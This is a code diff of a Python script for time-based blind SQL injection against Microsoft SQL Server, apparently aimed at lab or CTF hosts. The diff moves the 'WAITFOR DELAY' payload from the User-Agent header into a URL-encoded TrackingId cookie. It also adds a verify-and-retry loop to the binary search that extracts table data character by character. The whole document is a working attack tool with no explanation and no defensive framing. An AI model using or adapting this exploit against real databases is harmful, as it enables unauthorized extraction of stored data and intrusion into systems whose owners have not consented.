@@ -5,16 +5,18 @@ import requests
 import json
 import sys
 import time
-from urllib.parse import urlencode
+from urllib.parse import quote
 
 MODE="time-based"
 DELAY = 3
 def oracle(expression):
     if (MODE == "time-based"):
         start = time.time()
+        payload = quote(f"';IF({expression}) WAITFOR DELAY '0:0:{DELAY}'-- -")
+        cookies = {'TrackingId': f"d0944eb380d48adc3dc6effeb4805286{payload}"}
         r = requests.get(
-            "http://10.129.2.104:8080/",
-            headers={"User-Agent": f"';IF({expression}) WAITFOR DELAY '0:0:{DELAY}'-- -"}
+            "http://10.129.204.202/",
+            cookies=cookies
         )
         if (time.time() - start > DELAY):
             return True
@@ -107,13 +109,19 @@ for offset in range(0, RowCount):
     for i in range(1, length + 1):
         low = 32 # 可打印ASCII字符范围 32-127
         high = 127
-        while low < high:
-            mid = (low + high) // 2
-            if oracle(f"ASCII(SUBSTRING((SELECT {column} FROM {table} WHERE {filters} ORDER BY {column} OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY),{i},1)) > {mid}"):
-                low = mid + 1
+        attempt = 0
+        while(attempt < 4):
+            while low < high:
+                mid = (low + high) // 2
+                if oracle(f"ASCII(SUBSTRING((SELECT {column} FROM {table} WHERE {filters} ORDER BY {column} OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY),{i},1)) > {mid}"):
+                    low = mid + 1
+                else:
+                    high = mid
+            if oracle(f"ASCII(SUBSTRING((SELECT {column} FROM {table} WHERE {filters} ORDER BY {column} OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY),{i},1)) = {low}"):
+                print(chr(low), end='')
+                break
             else:
-                high = mid
-        print(chr(low), end='')
+                attempt = attempt + 1
         sys.stdout.flush()
     print()
     print()
